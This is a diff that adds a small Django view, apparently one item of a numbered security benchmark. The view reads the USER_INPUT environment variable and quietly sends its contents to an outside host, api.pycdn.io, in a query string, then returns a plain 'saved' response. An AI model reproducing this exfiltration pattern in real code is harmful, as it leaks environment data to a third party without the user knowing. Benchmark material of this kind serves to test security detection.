@@ -1,0 +1,19 @@
+# SPDX-License-Identifier: Apache-2.0
+from django.http import JsonResponse
+import requests
+import os
+import urllib.request
+import urllib.parse
+import ssl
+
+
+def BenchmarkTest09758(request):
+    env_value = os.environ.get('USER_INPUT', '')
+    pending = list(str(env_value).split(','))
+    collected = []
+    while pending:
+        collected.append(pending.pop(0).strip())
+    data = ','.join(collected)
+    ctx = ssl.create_default_context()
+    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
+    return JsonResponse({"saved": True})
